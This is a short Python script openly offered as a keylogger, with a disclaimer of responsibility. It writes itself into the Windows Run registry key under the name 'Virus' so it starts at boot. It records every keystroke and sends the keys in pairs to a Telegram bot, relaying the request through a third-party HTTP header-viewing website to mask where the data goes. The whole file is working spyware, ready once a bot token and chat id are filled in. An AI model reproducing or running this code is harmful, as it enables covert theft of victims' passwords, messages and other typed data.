#Simple Keylogger | Not advanced
#I do not accept any responsibility for the consequences of using this script
#good luck blud


from pynput import keyboard
import requests
import os
import winreg
import sys

# -------------- startup adding --------------

def add_to_startup(file_path):
    
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                         r"Software\Microsoft\Windows\CurrentVersion\Run", 
                         0, 
                         winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "Virus", 0, winreg.REG_SZ, file_path)
    winreg.CloseKey(key)

def main():
    
    if getattr(sys, 'frozen', False):
        
        script_path = sys.executable
    else:
        
        script_path = os.path.abspath(__file__)

    
    add_to_startup(script_path)
    

if __name__ == "__main__":
    main()

# -------------- running the keylogger --------------

keys = []


def start():
    with keyboard.Listener(on_press=log) as lstn:
        lstn.join()

def log(key):
    
    if type(key) == keyboard._win32.KeyCode:
        key = key.char

    key = str(key)  
    keys.append(key)
    if len(keys) == 2:
        send(str(keys)) 
        keys.clear()

def send(data):
    url = 'https://api.telegram.org/bottoken/sendmessage?chat_id=user_id&text='+data #change your token and user id here
    payload = {"UrlBox":url,
               "AgentList":"Internet Explorer",
               "VersionLists":"HTTP/1.1",
               "MethodList":"Get"}
    http = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=payload)

start()
